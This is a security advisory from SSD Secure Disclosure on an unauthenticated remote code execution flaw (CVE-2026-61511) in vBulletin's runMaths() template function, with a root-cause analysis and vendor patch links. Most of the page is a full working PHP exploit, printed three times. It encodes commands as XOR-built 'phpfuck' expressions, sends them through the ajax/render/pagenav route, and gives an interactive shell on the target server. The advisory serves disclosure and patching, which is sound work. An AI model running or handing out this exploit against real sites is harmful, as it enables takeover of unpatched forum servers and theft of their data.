@@ -1,0 +1,338 @@
+Title: vBulletin Runtime Template runMaths Preauth RCE
+
+URL Source: https://ssd-disclosure.com/vbulletin-runtime-template-runmaths-preauth-rce/
+
+Published Time: 2026-07-27T07:54:05+00:00
+
+Markdown Content:
+*   [July 27, 2026](https://ssd-disclosure.com/2026/07/27/)
+*   [SSD Secure Disclosure technical team](https://ssd-disclosure.com/author/ssd-secure-disclosure-technical-team/)
+*   [Vulnerability publication](https://ssd-disclosure.com/category/vulnerability-publication/)
+
+##### Summary
+
+A vulnerability in vBulletin has been identified, the vulnerability allows an unauthenticated user to cause the vBulletin to execute arbitrary code (PHP) on the remote server.
+
+##### **Vendor Response**
+
+The vendor has issued a fix available at: [https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4509404-vbulletin-6-2-2-is-available](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4509404-vbulletin-6-2-2-is-available) and [https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4509358-security-patch-released-for-vbulletin-6-2-1-6-2-0-and-6-1-6](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4509358-security-patch-released-for-vbulletin-6-2-1-6-2-0-and-6-1-6)
+
+##### CVE
+
+CVE-2026-61511
+
+##### Credit
+
+An independent security researcher working with SSD Secure Disclosure.
+
+##### Affected Versions
+
+*   vBulletin 6.2.1 and prior
+*   vBulletin 6.1.6 and prior
+
+##### Root Cause Analysis
+
+The vulnerable code is located in the `/includes/vb5/template/runtime.php` script.
+
+Specifically, into the “vB5_Template_Runtime::runMaths()” method:
+
+Plain text
+
+Copy to clipboard
+
+Open code in new window
+
+EnlighterJS 3 Syntax Highlighter
+
+[...]
+
+public static function runMaths($str)
+
+{
+
+[...]
+
+$str = preg_replace('#([^+\-*=/\(\)\d\^<>&|\.]*)#', '', $str);
+
+if(empty($str))
+
+{
+
+$str = '0';
+
+}
+
+else
+
+{
+
+[...]
+
+try
+
+{
+
+$status = @eval("\$str = $str;");
+
+}
+
+catch(Error $e)
+
+{
+
+$status = false;
+
+}
+
+[...]
+
+[...] public static function runMaths($str) { [...] $str = preg_replace('#([^+\-*=/\(\)\d\^<>&|\.]*)#', '', $str); if (empty($str)) { $str = '0'; } else { [...] try { $status = @eval("\$str = $str;"); } catch(Error $e) { $status = false; } [...]
+
+[...]
+
+	public static function runMaths($str)
+	{
+		[...]
+	
+		$str = preg_replace('#([^+\-*=/\(\)\d\^<>&|\.]*)#', '', $str);
+
+		if (empty($str))
+		{
+			$str = '0';
+		}
+		else
+		{
+			[...]
+			
+			try
+			{
+				$status = @eval("\$str = $str;");
+			}
+			catch(Error $e)
+			{
+				$status = false;
+			}
+[...]
+			
+The “$str” parameter is not sufficiently sanitized before being used in an eval() call. The used regex will allow for digits, parentheses, math and binary operators (the XOR, particularly).
+
+As such, this can be exploited to inject and execute (semi) arbitrary PHP code through “phpfuck techniques” (see e.g. [https://github.com/arxenix/phpfuck](https://github.com/arxenix/phpfuck)).
+
+The vulnerability could be exploited by editing a template/style in the admin panel and adding a specially crafted `{vb:math}` tag. However, this can also be exploited by unauthenticated attackers by abusing the “ajax/render/[template]” route, rendering a template which uses `{vb:math}` with an user-tainted parameter. One of the possible templates that can be abused that way is “pagenav”:
+
+Plain text
+
+Copy to clipboard
+
+Open code in new window
+
+EnlighterJS 3 Syntax Highlighter
+
+[...]
+
+<vb:elseif condition="isset($pagenav['pagenumber'])" />
+
+{vb:set pagenav.currentpage, {vb:raw pagenav.pagenumber}}
+
+</vb:if>
+
+[...]
+
+<vb:if condition="$pagenav['currentpage'] != 1">
+
+<a class="js-pagenav-button [...] data-page="{vb:math {vb:var pagenav.currentpage} - 1}"
+
+[...]
+
+[...] <vb:elseif condition="isset($pagenav['pagenumber'])" /> {vb:set pagenav.currentpage, {vb:raw pagenav.pagenumber}} </vb:if> [...] <vb:if condition="$pagenav['currentpage'] != 1"><a class="js-pagenav-button [...] data-page="{vb:math {vb:var pagenav.currentpage} - 1}" [...]
+
+[...]
+
+<vb:elseif condition="isset($pagenav['pagenumber'])" />
+	{vb:set pagenav.currentpage, {vb:raw pagenav.pagenumber}}
+</vb:if>
+
+[...]
+
+<vb:if condition="$pagenav['currentpage'] != 1">
+	<a class="js-pagenav-button [...] data-page="{vb:math {vb:var pagenav.currentpage} - 1}"
+
+[...]
+Here, user input passed through the `pagenav[pagenumber]` parameter will be assigned to the `pagenav.currentpage` template variable, which is later used within a `{vb:math}` tag, thus passed to the `vB5_Template_Runtime::runMaths()` method, which in turn will pass this string to eval()
+
+##### Exploit
+
+Plain text
+
+Copy to clipboard
+
+Open code in new window
+
+EnlighterJS 3 Syntax Highlighter
+
+<?php
+
+set_time_limit(0);
+
+error_reporting(E_ERROR);
+
+print"+-------------------------------------+\n";
+
+print"| vBulletin 0-day RCE exploit by EgiX |\n";
+
+print"+-------------------------------------+\n";
+
+if(!extension_loaded("curl"))die("\n[+] cURL extension required!\n");
+
+if($argc != 2){
+
+print"\nUsage......: php $argv[0] <URL>\n";
+
+print"\nExample....: php $argv[0] http://localhost/vb/";
+
+print"\nExample....: php $argv[0] https://vbulletin.com/\n\n";
+
+die();
+
+}
+
+function encodeChar($char)
+
+{
+
+$numbers = ['0' =>'(O)', '1' =>'(1)', '2' =>'(2)', '3' =>'(3)', '4' =>'(4)', '5' =>'(5)', '6' =>'(6)', '7' =>'(7)', '8' =>'(8)', '9' =>'(9)'];
+
+$char = strval(ord($char));
+
+$ret = '';
+
+for($i = 0; $i<strlen($char); $i++)$ret .= $numbers[$char[$i]] . '.';
+
+return rtrim($ret,'.');
+
+}
+
+function makePayload($function,$param)
+
+{
+
+$chr_fun = '((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((2).(0).(4)))^((8).(6).(((9).(9))^((9).(9)))))';
+
+$ret = '';
+
+foreach(str_split($function)as$c)$ret .= $chr_fun . '(' . encodeChar($c) . ').';
+
+$ret = "(" . rtrim($ret,'.') . ')((';
+
+foreach(str_split($param)as$c)$ret .= $chr_fun . '(' . encodeChar($c) . ').';
+
+return rtrim($ret,'.') . '))';
+
+}
+
+$curl = curl_init();
+
+$params = ["routestring" =>"ajax/render/pagenav"];
+
+curl_setopt($curl, CURLOPT_URL, $argv[1]);
+
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+//curl_setopt($curl, CURLOPT_PROXY, "http://127.0.0.1:8080");
+
+while(1){
+
+print"\nvb-shell# ";
+
+if(($cmd = trim(fgets(STDIN))) == "exit")break;
+
+$cmd .= "; echo _____";
+
+$params["pagenav[pagenumber]"] = makePayload("system", $cmd);
+
+curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($params));
+
+preg_match('/_____(.*)_____/s', curl_exec($curl), $m) ? print$m[1] : die("\n[+] Exploit failed! :(\n\n");
+
+}
+
+<?php set_time_limit(0); error_reporting(E_ERROR); print "+-------------------------------------+\n"; print "| vBulletin 0-day RCE exploit by EgiX |\n"; print "+-------------------------------------+\n"; if (!extension_loaded("curl")) die("\n[+] cURL extension required!\n"); if ($argc != 2) { print "\nUsage......: php $argv[0] <URL>\n"; print "\nExample....: php $argv[0] http://localhost/vb/"; print "\nExample....: php $argv[0] https://vbulletin.com/\n\n"; die(); } function encodeChar($char) { $numbers = ['0' => '(O)', '1' => '(1)', '2' => '(2)', '3' => '(3)', '4' => '(4)', '5' => '(5)', '6' => '(6)', '7' => '(7)', '8' => '(8)', '9' => '(9)']; $char = strval(ord($char)); $ret = ''; for ($i = 0; $i < strlen($char); $i++) $ret .= $numbers[$char[$i]] . '.'; return rtrim($ret, '.'); } function makePayload($function, $param) { $chr_fun = '((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((2).(0).(4)))^((8).(6).(((9).(9))^((9).(9)))))'; $ret = ''; foreach (str_split($function) as $c) $ret .= $chr_fun . '(' . encodeChar($c) . ').'; $ret = "(" . rtrim($ret, '.') . ')(('; foreach (str_split($param) as $c) $ret .= $chr_fun . '(' . encodeChar($c) . ').'; return rtrim($ret, '.') . '))'; } $curl = curl_init(); $params = ["routestring" => "ajax/render/pagenav"]; curl_setopt($curl, CURLOPT_URL, $argv[1]); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); //curl_setopt($curl, CURLOPT_PROXY, "http://127.0.0.1:8080"); while (1) { print "\nvb-shell# "; if (($cmd = trim(fgets(STDIN))) == "exit") break; $cmd .= "; echo _____"; $params["pagenav[pagenumber]"] = makePayload("system", $cmd); curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($params)); preg_match('/_____(.*)_____/s', curl_exec($curl), $m) ? print $m[1] : die("\n[+] Exploit failed! :(\n\n"); }
+
+<?php
+
+set_time_limit(0);
+error_reporting(E_ERROR);
+
+print "+-------------------------------------+\n";
+print "| vBulletin 0-day RCE exploit by EgiX |\n";
+print "+-------------------------------------+\n";
+
+if (!extension_loaded("curl")) die("\n[+] cURL extension required!\n");
+
+if ($argc != 2) {
+    print "\nUsage......: php $argv[0] <URL>\n";
+    print "\nExample....: php $argv[0] http://localhost/vb/";
+    print "\nExample....: php $argv[0] https://vbulletin.com/\n\n";
+    die();
+}
+
+function encodeChar($char)
+{
+    $numbers = ['0' => '(O)', '1' => '(1)', '2' => '(2)', '3' => '(3)', '4' => '(4)', '5' => '(5)', '6' => '(6)', '7' => '(7)', '8' => '(8)', '9' => '(9)'];
+
+    $char = strval(ord($char));
+
+    $ret = '';
+    for ($i = 0; $i < strlen($char); $i++) $ret .= $numbers[$char[$i]] . '.';
+
+    return rtrim($ret, '.');
+}
+
+function makePayload($function, $param)
+{
+    $chr_fun = '((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((2).(0).(4)))^((8).(6).(((9).(9))^((9).(9)))))';
+
+    $ret = '';
+    foreach (str_split($function) as $c) $ret .= $chr_fun . '(' . encodeChar($c) . ').';
+
+    $ret = "(" . rtrim($ret, '.') . ')((';
+
+    foreach (str_split($param) as $c) $ret .= $chr_fun . '(' . encodeChar($c) . ').';
+
+    return rtrim($ret, '.') . '))';
+}
+
+$curl   = curl_init();
+$params = ["routestring" => "ajax/render/pagenav"];
+
+curl_setopt($curl, CURLOPT_URL, $argv[1]);
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+//curl_setopt($curl, CURLOPT_PROXY, "http://127.0.0.1:8080");
+
+while (1) {
+    print "\nvb-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    $cmd .= "; echo _____";
+    $params["pagenav[pagenumber]"] = makePayload("system", $cmd);
+    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($params));
+    preg_match('/_____(.*)_____/s', curl_exec($curl), $m) ? print $m[1] : die("\n[+] Exploit failed! :(\n\n");
+}
+
+Links/Buttons:
+- [Skip to content](https://ssd-disclosure.com/vbulletin-runtime-template-runmaths-preauth-rce/#content)
+- [Increase Text](https://ssd-disclosure.com/vbulletin-runtime-template-runmaths-preauth-rce/#)
+- [](https://ssd-disclosure.com/vbulletin-runtime-template-runmaths-preauth-rce/#elementor-action%3Aaction%3Dpopup%3Aopen%26settings%3DeyJpZCI6IjU4MTMiLCJ0b2dnbGUiOmZhbHNlfQ%3D%3D)
+- [July 27, 2026](https://ssd-disclosure.com/2026/07/27/)
+- [SSD Secure Disclosure technical team](https://ssd-disclosure.com/author/ssd-secure-disclosure-technical-team/)
+- [Vulnerability publication](https://ssd-disclosure.com/category/vulnerability-publication/)
+- [https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4509404-vbulletin-6-2-2-is-available](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4509404-vbulletin-6-2-2-is-available)
+- [https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4509358-security-patch-released-for-vbulletin-6-2-1-6-2-0-and-6-1-6](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4509358-security-patch-released-for-vbulletin-6-2-1-6-2-0-and-6-1-6)
+- [https://github.com/arxenix/phpfuck](https://github.com/arxenix/phpfuck)
+- [Contact US](https://ssd-disclosure.com/vbulletin-runtime-template-runmaths-preauth-rce/#elementor-action%3Aaction%3Dpopup%3Aopen%26settings%3DeyJpZCI6IjYwMTgiLCJ0b2dnbGUiOmZhbHNlfQ%3D%3D)
+- [Facebook](https://www.facebook.com/ssdsecuredisclosure/)
+- [Twitter](https://twitter.com/SecuriTeam_SSD)
+- [Youtube](https://www.youtube.com/channel/UC9ZnYbYqOe6Y3eRdw0TMz9Q)
+- [Linkedin](https://www.linkedin.com/company/ssd-disclosure)
